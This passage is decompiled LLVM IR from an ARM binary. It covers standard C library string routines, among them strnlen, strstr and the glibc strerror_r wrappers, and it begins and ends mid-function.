  %v4_140b8 = inttoptr i32 %v3_140b8 to i8*
  store i8 %v3_140b0, i8* %v4_140b8, align 1
  %v5_140b8 = load i32, i32* %ip.global-to-local, align 4
  %v6_140b8 = add i32 %v5_140b8, 1
  store i32 %v6_140b8, i32* %ip.global-to-local, align 4
  %v0_140bc = load i32, i32* @r1, align 4
  %v1_140bc = add i32 %v0_140bc, 1
  store i32 %v1_140bc, i32* %r1.global-to-local, align 4
  %v0_140c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140c0, label %dec_label_pc_140fc, label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140b0
  %v1_140c4 = add i32 %v0_140bc, 2
  %v2_140c4 = inttoptr i32 %v1_140c4 to i8*
  %v3_140c4 = load i8, i8* %v2_140c4, align 1
  %v4_140c4 = zext i8 %v3_140c4 to i32
  store i32 %v4_140c4, i32* %r3.global-to-local, align 4
  %v2_140c8 = icmp eq i8 %v3_140c4, 0
  store i1 %v2_140c8, i1* %cpsr_z.global-to-local, align 1
  %v3_140cc = add i32 %v5_140b8, 2
  %v4_140cc = inttoptr i32 %v3_140cc to i8*
  store i8 %v3_140c4, i8* %v4_140cc, align 1
  %v5_140cc = load i32, i32* %ip.global-to-local, align 4
  %v6_140cc = add i32 %v5_140cc, 1
  store i32 %v6_140cc, i32* %ip.global-to-local, align 4
  %v0_140d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_140d0 = add i32 %v0_140d0, 1
  store i32 %v1_140d0, i32* %r1.global-to-local, align 4
  %v0_140d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140d4, label %dec_label_pc_140fc, label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140c4
  %v1_140d8 = add i32 %v0_140d0, 2
  %v2_140d8 = inttoptr i32 %v1_140d8 to i8*
  %v3_140d8 = load i8, i8* %v2_140d8, align 1
  %v4_140d8 = zext i8 %v3_140d8 to i32
  store i32 %v4_140d8, i32* %r3.global-to-local, align 4
  %v2_140dc = icmp eq i8 %v3_140d8, 0
  store i1 %v2_140dc, i1* %cpsr_z.global-to-local, align 1
  %v3_140e0 = add i32 %v5_140cc, 2
  %v4_140e0 = inttoptr i32 %v3_140e0 to i8*
  store i8 %v3_140d8, i8* %v4_140e0, align 1
  %v5_140e0 = load i32, i32* %ip.global-to-local, align 4
  %v6_140e0 = add i32 %v5_140e0, 1
  store i32 %v6_140e0, i32* %ip.global-to-local, align 4
  %v0_140e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_140e4 = add i32 %v0_140e4, 1
  store i32 %v1_140e4, i32* %r1.global-to-local, align 4
  %v0_140e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140e8, label %dec_label_pc_140fc, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140d8
  %v0_140ec = load i32, i32* @lr, align 4
  %v1_140ec = add i32 %v0_140ec, -1
  store i32 %v1_140ec, i32* @lr, align 4
  %v7_140ec = icmp eq i32 %v0_140ec, 1
  store i1 %v7_140ec, i1* %cpsr_z.global-to-local, align 1
  %v1_140f0 = add i32 %v0_140e4, 2
  store i32 %v1_140f0, i32* @r1, align 4
  br i1 %v7_140ec, label %dec_label_pc_14110, label %dec_label_pc_140a0

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140d8, %dec_label_pc_140c4, %dec_label_pc_140b0, %dec_label_pc_140a0
  %v1_140fc = phi i32 [ %v6_140e0, %dec_label_pc_140d8 ], [ %v6_140cc, %dec_label_pc_140c4 ], [ %v6_140b8, %dec_label_pc_140b0 ], [ %v6_140a8, %dec_label_pc_140a0 ]
  %v2_140fc1 = sub i32 %arg1, %v1_140fc
  %v2_14100 = add i32 %v2_140fc1, %arg2
  store i32 %v2_14100, i32* %r3.global-to-local, align 4
  %v1_14104 = add i32 %v2_14100, -1
  store i32 %v1_14104, i32* %r2.global-to-local, align 4
  %v7_14104 = icmp eq i32 %v2_14100, 1
  store i1 %v7_14104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14104, label %bb, label %dec_label_pc_14130

bb:                                               ; preds = %dec_label_pc_140fc
  ret i32 %arg1

dec_label_pc_14110:                               ; preds = %dec_label_pc_140ec, %entry
  %v2_141206 = phi i32 [ %v1_14094, %entry ], [ %v6_140e0, %dec_label_pc_140ec ]
  %v1_14110 = urem i32 %arg2, 4
  store i32 %v1_14110, i32* %r2.global-to-local, align 4
  %v2_14110 = icmp eq i32 %v1_14110, 0
  store i1 %v2_14110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14110, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_14110
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14110, %._crit_edge
  %v2_14120 = phi i32 [ %v6_14120, %._crit_edge ], [ %v2_141206, %dec_label_pc_14110 ]
  %v0_1411c = phi i32 [ %v0_1411c.pre, %._crit_edge ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_14118 = load i32, i32* @r1, align 4
  %v1_14118 = inttoptr i32 %v0_14118 to i8*
  %v2_14118 = load i8, i8* %v1_14118, align 1
  %v3_14118 = zext i8 %v2_14118 to i32
  store i32 %v3_14118, i32* %r3.global-to-local, align 4
  %v5_14118 = add i32 %v0_14118, 1
  store i32 %v5_14118, i32* @r1, align 4
  %v1_1411c = add i32 %v0_1411c, -1
  store i32 %v1_1411c, i32* %r2.global-to-local, align 4
  %v7_1411c = icmp eq i32 %v0_1411c, 1
  store i1 %v7_1411c, i1* %cpsr_z.global-to-local, align 1
  %v3_14120 = add i32 %v2_14120, 1
  %v4_14120 = inttoptr i32 %v3_14120 to i8*
  store i8 %v2_14118, i8* %v4_14120, align 1
  %v5_14120 = load i32, i32* %ip.global-to-local, align 4
  %v6_14120 = add i32 %v5_14120, 1
  store i32 %v6_14120, i32* %ip.global-to-local, align 4
  %v0_14124 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14124, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_14128 = load i32, i32* %r3.global-to-local, align 4
  %v2_14128 = icmp eq i32 %v0_14128, 0
  store i1 %v2_14128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14128, label %dec_label_pc_14130, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_1411c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_14130:                               ; preds = %dec_label_pc_140fc, %bb13, %dec_label_pc_14130
  %v2_14138 = phi i32 [ %v6_14138, %dec_label_pc_14130 ], [ %v1_140fc, %dec_label_pc_140fc ], [ %v6_14120, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14134 = load i32, i32* %r2.global-to-local, align 4
  %v1_14134 = add i32 %v0_14134, -1
  store i32 %v1_14134, i32* %r2.global-to-local, align 4
  %v7_14134 = icmp eq i32 %v0_14134, 1
  store i1 %v7_14134, i1* %cpsr_z.global-to-local, align 1
  %v3_14138 = add i32 %v2_14138, 1
  %v4_14138 = inttoptr i32 %v3_14138 to i8*
  store i8 0, i8* %v4_14138, align 1
  %v5_14138 = load i32, i32* %ip.global-to-local, align 4
  %v6_14138 = add i32 %v5_14138, 1
  store i32 %v6_14138, i32* %ip.global-to-local, align 4
  %v0_1413c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1413c, label %dec_label_pc_14140, label %dec_label_pc_14130

dec_label_pc_14140:                               ; preds = %dec_label_pc_14130
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_14138, { 1, 0 }
  uselistorder i32 %v0_14134, { 1, 0 }
  uselistorder i32 %v6_14120, { 0, 2, 1 }
  uselistorder i32 %v1_14110, { 2, 1, 0 }
  uselistorder i32 %v2_14100, { 2, 1, 0 }
  uselistorder i32 %v1_140f0, { 1, 0 }
  uselistorder i32 %v0_140ec, { 1, 0 }
  uselistorder i32 %v6_140e0, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 1, 2, 4, 0, 3 }
  uselistorder label %dec_label_pc_14130, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14144 = load i32, i32* @r1, align 4
  %v2_14144 = icmp eq i32 %v0_14144, 0
  br i1 %v2_14144, label %bb, label %dec_label_pc_14174

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14184
  %v3_1415c = icmp uge i32 %v5_14210, %v1_1415c
  %v9_1415c = icmp eq i32 %v5_14210, %v1_1415c
  %v2_14160 = xor i1 %v3_1415c, true
  %v3_14160 = or i1 %v9_1415c, %v2_14160
  br i1 %v3_14160, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_1415c
  %v6_14160 = sub i32 %v5_14210, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1415c, %bb19
  %v5_14164 = phi i32 [ %v1_1415c, %dec_label_pc_1415c ], [ %v6_14160, %bb19 ]
  %v2_14164 = xor i1 %v9_1415c, true
  %v3_14164 = and i1 %v3_1415c, %v2_14164
  br i1 %v3_14164, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_14164 = sub i32 %v5_14164, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_14168 = phi i32 [ %v5_14164, %bb20 ], [ %v6_14164, %bb21 ]
  ret i32 %v8_14168

dec_label_pc_1416c:                               ; preds = %dec_label_pc_141b8
  br label %dec_label_pc_1420c

dec_label_pc_14174:                               ; preds = %entry
  %v2_14174 = add i32 %tmp, %v0_14144
  %v3_14174 = icmp ult i32 %v2_14174, %tmp
  br i1 %v3_14174, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_14174
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_14174, %bb23
  %v5_14210 = phi i32 [ %v2_14174, %dec_label_pc_14174 ], [ -1, %bb23 ]
  %v1_141942 = urem i32 %tmp, 4
  %v2_141943 = icmp eq i32 %v1_141942, 0
  br i1 %v2_141943, label %dec_label_pc_1419c, label %dec_label_pc_14184

dec_label_pc_14184:                               ; preds = %bb24, %dec_label_pc_14190
  %v1_1415c = phi i32 [ %v1_14190, %dec_label_pc_14190 ], [ %tmp, %bb24 ]
  %v1_14184 = inttoptr i32 %v1_1415c to i8*
  %v2_14184 = load i8, i8* %v1_14184, align 1
  %v2_14188 = icmp eq i8 %v2_14184, 0
  br i1 %v2_14188, label %dec_label_pc_1415c, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14184
  %v1_14190 = add i32 %v1_1415c, 1
  %v1_14194 = urem i32 %v1_14190, 4
  %v2_14194 = icmp eq i32 %v1_14194, 0
  br i1 %v2_14194, label %dec_label_pc_1419c, label %dec_label_pc_14184

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14190, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_14190, %dec_label_pc_14190 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_141fc32 = icmp ult i32 %storemerge.lcssa, %v5_14210
  br i1 %v3_141fc32, label %dec_label_pc_141a4, label %dec_label_pc_1420c

dec_label_pc_141a4:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_1419c
  %v0_1416c39 = phi i32 [ %v4_141a4, %dec_label_pc_141f8 ], [ %storemerge.lcssa, %dec_label_pc_1419c ]
  %v1_141a4 = inttoptr i32 %v0_1416c39 to i32*
  %v2_141a4 = load i32, i32* %v1_141a4, align 4
  %v4_141a4 = add i32 %v0_1416c39, 4
  store i32 %v4_141a4, i32* @lr, align 4
  %v2_141a8 = add i32 %v2_141a4, -16843009
  %v2_141ac = and i32 %v2_141a8, -2139062144
  %v2_141b0 = icmp eq i32 %v2_141ac, 0
  br i1 %v2_141b0, label %dec_label_pc_141f8, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141a4
  %v2_141b8 = inttoptr i32 %v0_1416c39 to i8*
  %v3_141b8 = load i8, i8* %v2_141b8, align 1
  %v2_141c0 = icmp eq i8 %v3_141b8, 0
  %v1_141c4 = add i32 %v0_1416c39, 1
  br i1 %v2_141c0, label %dec_label_pc_1416c, label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b8
  %v2_141cc = inttoptr i32 %v1_141c4 to i8*
  %v3_141cc = load i8, i8* %v2_141cc, align 1
  %v2_141d0 = icmp eq i8 %v3_141cc, 0
  br i1 %v2_141d0, label %dec_label_pc_1420c, label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141cc
  %v1_141d8 = add i32 %v0_1416c39, 2
  %v2_141d8 = inttoptr i32 %v1_141d8 to i8*
  %v3_141d8 = load i8, i8* %v2_141d8, align 1
  %v2_141dc = icmp eq i8 %v3_141d8, 0
  br i1 %v2_141dc, label %dec_label_pc_1420c, label %dec_label_pc_141e8

dec_label_pc_141e8:                               ; preds = %dec_label_pc_141d8
  %v1_141e8 = add i32 %v0_1416c39, 3
  %v2_141e8 = inttoptr i32 %v1_141e8 to i8*
  %v3_141e8 = load i8, i8* %v2_141e8, align 1
  %v2_141ec = icmp eq i8 %v3_141e8, 0
  br i1 %v2_141ec, label %dec_label_pc_1420c, label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141e8, %dec_label_pc_141a4
  %v3_141fc = icmp ult i32 %v4_141a4, %v5_14210
  br i1 %v3_141fc, label %dec_label_pc_141a4, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_1419c, %dec_label_pc_141cc, %dec_label_pc_141d8, %dec_label_pc_141e8, %dec_label_pc_1416c
  %v1_1420c = phi i32 [ %v0_1416c39, %dec_label_pc_1416c ], [ %storemerge.lcssa, %dec_label_pc_1419c ], [ %v1_141c4, %dec_label_pc_141cc ], [ %v1_141d8, %dec_label_pc_141d8 ], [ %v1_141e8, %dec_label_pc_141e8 ], [ %v5_14210, %dec_label_pc_141f8 ]
  %v3_1420c = icmp uge i32 %v5_14210, %v1_1420c
  %v9_1420c = icmp eq i32 %v5_14210, %v1_1420c
  %v2_14210 = xor i1 %v3_1420c, true
  %v3_14210 = or i1 %v9_1420c, %v2_14210
  br i1 %v3_14210, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1420c
  %v6_14210 = sub i32 %v5_14210, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1420c, %bb25
  %v5_14214 = phi i32 [ %v1_1420c, %dec_label_pc_1420c ], [ %v6_14210, %bb25 ]
  %v2_14214 = xor i1 %v9_1420c, true
  %v3_14214 = and i1 %v3_1420c, %v2_14214
  br i1 %v3_14214, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_14214 = sub i32 %v5_14214, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_14218 = phi i32 [ %v5_14214, %bb26 ], [ %v6_14214, %bb27 ]
  ret i32 %v8_14218

; uselistorder directives
  uselistorder i1 %v3_1420c, { 1, 0 }
  uselistorder i32 %v4_141a4, { 1, 2, 0 }
  uselistorder i32 %v0_1416c39, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14190, { 1, 0, 2 }
  uselistorder i32 %v1_1415c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_14210, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_1415c, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1420c, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_14184, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_14224 = load i32, i32* @r5, align 4
  %v9_14224 = load i32, i32* @r6, align 4
  %v3_14228 = load i8, i8* %arg2, align 1
  %v2_1422c = icmp eq i8 %v3_14228, 0
  br i1 %v2_1422c, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_14234 = add i32 %arg1, -1
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14244, %bb50
  %v0_14238 = phi i32 [ %v1_14238, %dec_label_pc_14244 ], [ %v1_14234, %bb50 ]
  %v1_14238 = add i32 %v0_14238, 1
  %v2_14238 = inttoptr i32 %v1_14238 to i8*
  %v3_14238 = load i8, i8* %v2_14238, align 1
  %v2_1423c = icmp eq i8 %v3_14238, 0
  br i1 %v2_1423c, label %dec_label_pc_14314, label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_14238
  %v9_14244 = icmp eq i8 %v3_14238, %v3_14228
  br i1 %v9_14244, label %dec_label_pc_1424c, label %dec_label_pc_14238

dec_label_pc_1424c:                               ; preds = %dec_label_pc_14244
  %v2_1424c = add i32 %tmp, 1
  %v3_1424c = inttoptr i32 %v2_1424c to i8*
  %v4_1424c = load i8, i8* %v3_1424c, align 1
  %v2_14250 = icmp eq i8 %v4_1424c, 0
  br i1 %v2_14250, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_1424c
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_14238

bb52:                                             ; preds = %dec_label_pc_1424c
  %v1_1425c = add i32 %v0_14238, 2
  %v1_142b0 = add i32 %tmp, 2
  %v2_142b0 = inttoptr i32 %v1_142b0 to i8*
  br label %dec_label_pc_142a8

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14308
  %v3_1426c = load i8, i8* %v3_142a0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_14298.preheader

dec_label_pc_14298.preheader:                     ; preds = %dec_label_pc_1426c, %dec_label_pc_142a8
  %v0_142984.in = phi i8 [ %v3_1426c, %dec_label_pc_1426c ], [ %v3_142a0.pn, %dec_label_pc_142a8 ]
  %v9_1429813 = icmp eq i8 %v0_142984.in, %v3_14228
  br i1 %v9_1429813, label %dec_label_pc_142a0, label %dec_label_pc_14278

dec_label_pc_14278:                               ; preds = %dec_label_pc_14298.preheader, %dec_label_pc_14294
  %v0_14280 = phi i32 [ %v1_14294, %dec_label_pc_14294 ], [ %storemerge43, %dec_label_pc_14298.preheader ]
  %v0_14278.in = phi i8 [ %v3_14294, %dec_label_pc_14294 ], [ %v0_142984.in, %dec_label_pc_14298.preheader ]
  %v2_14278 = icmp eq i8 %v0_14278.in, 0
  br i1 %v2_14278, label %dec_label_pc_14314, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14278
  %v1_14280 = add i32 %v0_14280, 1
  %v2_14280 = inttoptr i32 %v1_14280 to i8*
  %v3_14280 = load i8, i8* %v2_14280, align 1
  store i32 %v1_14280, i32* @ip, align 4
  %v9_14284 = icmp eq i8 %v3_14280, %v3_14228
  br i1 %v9_14284, label %dec_label_pc_142a0, label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14280
  %v2_1428c = icmp eq i8 %v3_14280, 0
  br i1 %v2_1428c, label %dec_label_pc_14314, label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %dec_label_pc_1428c
  %v1_14294 = add i32 %v0_14280, 2
  %v2_14294 = inttoptr i32 %v1_14294 to i8*
  %v3_14294 = load i8, i8* %v2_14294, align 1
  store i32 %v1_14294, i32* @ip, align 4
  %v9_14298 = icmp eq i8 %v3_14294, %v3_14228
  br i1 %v9_14298, label %dec_label_pc_142a0, label %dec_label_pc_14278

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14280, %dec_label_pc_14294, %dec_label_pc_14298.preheader
  %v0_142a0 = phi i32 [ %storemerge43, %dec_label_pc_14298.preheader ], [ %v1_14280, %dec_label_pc_14280 ], [ %v1_14294, %dec_label_pc_14294 ]
  %v1_142a0 = add i32 %v0_142a0, 1
  br label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %bb52, %dec_label_pc_142a0
  %storemerge43 = phi i32 [ %v1_142a0, %dec_label_pc_142a0 ], [ %v1_1425c, %bb52 ]
  %v3_142a0.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_142a0.pn = load i8, i8* %v3_142a0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_142a0.pn, %v4_1424c
  br i1 %storemerge, label %dec_label_pc_142ac, label %dec_label_pc_14298.preheader

dec_label_pc_142ac:                               ; preds = %dec_label_pc_142a8
  %v1_142ac = add i32 %storemerge43, 1
  %v2_142ac = inttoptr i32 %v1_142ac to i8*
  %v3_142ac = load i8, i8* %v2_142ac, align 1
  %v4_142ac = zext i8 %v3_142ac to i32
  %v3_142b0 = load i8, i8* %v2_142b0, align 1
  %v4_142b0 = zext i8 %v3_142b0 to i32
  %v1_142b4 = add i32 %storemerge43, -1
  %v9_142b8 = icmp eq i8 %v3_142ac, %v3_142b0
  store i32 %v1_142b0, i32* @lr, align 4
  store i32 %v1_142ac, i32* @ip, align 4
  br i1 %v9_142b8, label %dec_label_pc_142c8, label %dec_label_pc_14308

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142ac, %dec_label_pc_142c4
  %v0_142e0 = phi i32 [ %v1_142e8, %dec_label_pc_142c4 ], [ %v1_142b0, %dec_label_pc_142ac ]
  %v0_142d8 = phi i32 [ %v1_142e4, %dec_label_pc_142c4 ], [ %v1_142ac, %dec_label_pc_142ac ]
  %v0_142c8 = phi i32 [ %v4_142f8, %dec_label_pc_142c4 ], [ %v4_142ac, %dec_label_pc_142ac ]
  %v2_142c8 = icmp eq i32 %v0_142c8, 0
  br i1 %v2_142c8, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_142c8
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

bb54:                                             ; preds = %dec_label_pc_142c8
  %v1_142d0 = add i32 %v0_142d8, 1
  %v2_142d0 = inttoptr i32 %v1_142d0 to i8*
  %v3_142d0 = load i8, i8* %v2_142d0, align 1
  %v1_142d4 = add i32 %v0_142e0, 1
  %v2_142d4 = inttoptr i32 %v1_142d4 to i8*
  %v3_142d4 = load i8, i8* %v2_142d4, align 1
  %v4_142d4 = zext i8 %v3_142d4 to i32
  store i32 %v1_142d0, i32* @r1, align 4
  %v9_142dc = icmp eq i8 %v3_142d0, %v3_142d4
  %v1_142e4 = add i32 %v0_142d8, 2
  store i32 %v1_142e4, i32* @ip, align 4
  %v1_142e8 = add i32 %v0_142e0, 2
  store i32 %v1_142e8, i32* @lr, align 4
  br i1 %v9_142dc, label %dec_label_pc_142f0, label %dec_label_pc_14308

dec_label_pc_142f0:                               ; preds = %bb54
  %v2_142f0 = icmp eq i8 %v3_142d0, 0
  br i1 %v2_142f0, label %bb55, label %dec_label_pc_142c4

bb55:                                             ; preds = %dec_label_pc_142f0
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142f0
  %v2_142f8 = inttoptr i32 %v1_142e8 to i8*
  %v3_142f8 = load i8, i8* %v2_142f8, align 1
  %v4_142f8 = zext i8 %v3_142f8 to i32
  %v2_142fc = inttoptr i32 %v1_142e4 to i8*
  %v3_142fc = load i8, i8* %v2_142fc, align 1
  %v9_14300 = icmp eq i8 %v3_142fc, %v3_142f8
  br i1 %v9_14300, label %dec_label_pc_142c8, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142c4, %bb54, %dec_label_pc_142ac
  %v0_14308 = phi i32 [ %v4_142b0, %dec_label_pc_142ac ], [ %v4_142f8, %dec_label_pc_142c4 ], [ %v4_142d4, %bb54 ]
  %v2_14308 = icmp eq i32 %v0_14308, 0
  br i1 %v2_14308, label %dec_label_pc_14310, label %dec_label_pc_1426c

dec_label_pc_14310:                               ; preds = %dec_label_pc_14308
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 %v1_142b4

dec_label_pc_14314:                               ; preds = %dec_label_pc_14238, %dec_label_pc_1428c, %dec_label_pc_14278
  store i32 %v6_14224, i32* @r5, align 4
  store i32 %v9_14224, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_142e8, { 0, 2, 1 }
  uselistorder i32 %v1_142e4, { 1, 2, 0 }
  uselistorder i32 %v1_142b4, { 2, 1, 0 }
  uselistorder i8 %v3_142a0.pn, { 1, 0 }
  uselistorder i8* %v3_142a0.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_14294, { 1, 0 }
  uselistorder i32 %v1_14294, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14238, { 0, 2, 1 }
  uselistorder i8 %v3_14228, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_14224, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_14224, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14314, { 1, 2, 0 }
  uselistorder label %dec_label_pc_142c8, { 1, 0 }
  uselistorder label %dec_label_pc_142a8, { 1, 0 }
  uselistorder label %dec_label_pc_142a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14278, { 1, 0 }
  uselistorder label %dec_label_pc_14298.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14324 = call i32 @__xpg_strerror_r()
  %v0_14328 = load i32, i32* @r4, align 4
  ret i32 %v0_14328
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14330 = load i32, i32* @r4, align 4
  %v0_14334 = load i32, i32* @r0, align 4
  %v0_14340 = load i32, i32* @r1, align 4
  store i32 %v0_14340, i32* @r8, align 4
  %v0_14344 = load i32, i32* @r2, align 4
  store i32 %v0_14344, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_14334, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_1437c

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_23f98.1112 to i32), i32* @r5, align 4
  %v2_143643446 = icmp eq i32 %v0_14334, 0
  br i1 %v2_143643446, label %bb26, label %dec_label_pc_14358.lr.ph

dec_label_pc_14358:                               ; preds = %dec_label_pc_14358.lr.ph, %bb
  %v2_1437041 = phi i1 [ %v2_143703849, %dec_label_pc_14358.lr.ph ], [ %v2_14370, %bb ]
  %v1_1437440 = phi i32 [ %v0_14364.pr48, %dec_label_pc_14358.lr.ph ], [ %v2_14360, %bb ]
  %v0_1435c39 = phi i32 [ %v0_14368547, %dec_label_pc_14358.lr.ph ], [ %v1_1435c, %bb ]
  %v1_1435c = add i32 %v0_1435c39, 1
  store i32 %v1_1435c, i32* @r5, align 4
  br i1 %v2_1437041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_14358
  %v2_14360 = add i32 %v1_1437440, -1
  %v2_14364 = icmp eq i32 %v2_14360, 0
  %v1_14368 = inttoptr i32 %v1_1435c to i8*
  %v2_14368 = load i8, i8* %v1_14368, align 1
  %v2_14370 = icmp eq i8 %v2_14368, 0
  br i1 %v2_14364, label %dec_label_pc_14370, label %dec_label_pc_14358

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_14358
  %v1_1436835 = inttoptr i32 %v1_1435c to i8*
  %v2_1436836 = load i8, i8* %v1_1436835, align 1
  %v2_1437038 = icmp eq i8 %v2_1436836, 0
  br label %dec_label_pc_14358.lr.ph

dec_label_pc_14358.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_143703849 = phi i1 [ %v2_1437038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_14364.pr48 = phi i32 [ %v1_1437440, %thread-pre-split.loopexit ], [ %v0_14334, %thread-pre-split.preheader ]
  %v0_14368547 = phi i32 [ %v1_1435c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_23f98.1112 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_14358

dec_label_pc_14370:                               ; preds = %bb
  br i1 %v2_14370, label %dec_label_pc_1437c, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_14370
  %v0_1435c.lcssa55 = phi i32 [ %v1_1435c, %dec_label_pc_14370 ], [ ptrtoint ([8 x i8]* @global_var_23f98.1112 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
